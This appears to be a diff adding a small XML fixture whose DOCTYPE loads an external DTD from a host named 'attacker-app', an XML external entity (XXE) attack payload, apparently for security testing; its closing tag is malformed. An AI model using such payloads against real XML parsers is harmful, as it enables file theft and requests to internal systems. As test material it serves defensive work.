@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE user SYSTEM "http://attacker-app:8080/attacker-app/xxe/vulnerable.dtd" >
+<users><user/><users>
